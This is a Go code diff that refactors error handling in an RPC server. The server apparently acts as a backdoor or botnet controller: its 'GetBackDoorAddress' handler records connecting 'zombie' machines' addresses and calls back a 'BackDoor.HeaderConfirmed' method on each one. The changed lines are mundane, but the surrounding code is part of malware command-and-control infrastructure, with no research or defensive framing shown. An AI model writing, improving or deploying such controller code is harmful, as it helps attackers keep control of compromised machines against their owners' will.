@@ -18,19 +18,20 @@ var OnlineMachine = make(chan string, 1000)
 type HeaderReceiver struct {
 }
 
-func NewServer() {
+func NewServer() (err error) {
 	rpcServer := new(statusRpcServer)
 	rpcServer.log = logs.NewLogger(100000)
-	rpcServer.log.SetLevel(log.Llongfile)
+	rpcServer.log.EnableFuncCallDepth(true)
 	rpcServer.log.SetLogger("console", "")
 	listener, e := net.Listen("tcp", ":1234")
 	if e != nil {
-		log.Fatal("listen error:", e)
+		return e
 	}
 
 	rpcServer.log.Info("start to listen local port at %s", "1234")
 	rpcServer.Register(new(HeaderReceiver))
 	rpcServer.Accept(listener)
+	return nil
 }
 
 func (rpc *statusRpcServer) Accept(lis net.Listener) {
@@ -45,7 +46,11 @@ func (rpc *statusRpcServer) Accept(lis net.Listener) {
 }
 
 func (c *HeaderReceiver) GetBackDoorAddress(args *RpcArgs, reply *int) error {
-	backDoorClient := NewClient(args.Argu)
+	backDoorClient, err := NewClient(args.Argu)
+	if err != nil {
+		return err
+	}
+
 	OnlineMachine <- args.Argu
 	backDoorClient.args.Argu = "Header received zombie rpc address"
 	err = backDoorClient.rpc.Call("BackDoor.HeaderConfirmed", backDoorClient.args, &reply)
